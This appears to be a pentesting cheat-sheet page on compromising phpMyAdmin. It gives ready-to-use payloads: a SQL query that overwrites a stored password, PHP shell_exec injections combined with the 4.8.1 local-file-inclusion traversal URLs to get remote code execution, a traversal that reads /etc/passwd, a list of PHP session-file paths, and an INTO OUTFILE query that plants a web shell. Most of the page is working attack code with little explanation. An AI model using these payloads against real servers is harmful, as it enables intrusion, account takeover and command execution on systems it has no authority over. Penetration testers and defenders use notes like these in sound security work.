# phpMyAdmin

[https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/)


### Change password
When we get access to the panel and see an interesting account with a hashed password, instead of cracking it we could try to change the password.

```
UPDATE 'table' set 'pass' = 'pass1234' where 'table'.'ID' = 1;
```


### 4.8.1 - LFI to RCE (Manual)
Go to SQL > execute query

```
SELECT '<pre><?php echo shell_exec($_GET["cmd"]);?>'
```

Note PHPMyAdmin **PHPESSID** **cookie** value and then run


```
http://$IP/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_$PHPMYADMIN_COOKIE&cmd=ls
```


Different paths for the PHP session

```bash
/var/lib/php/sessions/
/var/lib/php/session/
/var/lib/php5/sessions/
/var/lib/php5/sess_
# Windows: 
C:\Windows\Temp\
```

ANOTHER WAY

[https://cupuzone.wordpress.com/2018/07/23/a-little-study-about-latest-phpmyadmin-4-8-0-4-8-1-lfi-vulnerability/](https://cupuzone.wordpress.com/2018/07/23/a-little-study-about-latest-phpmyadmin-4-8-0-4-8-1-lfi-vulnerability/)

Test the vulnerability:

```
/index.php?target=db_sql.php%253f/../../../../../../../../../../../etc/passwd
```

Go to signon.php (examples/signon.php)and input this on username (shell between double quotes):

```php
<pre><?php echo shell_exec($_GET["shell"]);?>
```

Note the cookie **SignonSession** and then get RCE:


```
website.com/index.php?target=db_sql.php%253f/../../../../../../../../../../../var/lib/php/sessions/sess_vp5tmadp1jm0299tkqvk2rklml&shell=ls
```



### 4.8.1 exploit
[50457](https://www.exploit-db.com/exploits/50457)


### Webshell
| [https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/](https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/) |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

After logging in and with the privileges to write files, we go to **SQL** to execute this query:

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
```

???+ tip
    TRY PATHS SUCH AS /var/www/html, /var/www/phpmyadmin...
    
    On Windows, try something like`'C:\\xampp\\phpmyadmin\\cmd.php'`

Now we visit the webpage to have a webshell:

![](<../../assets/image (84).png>)


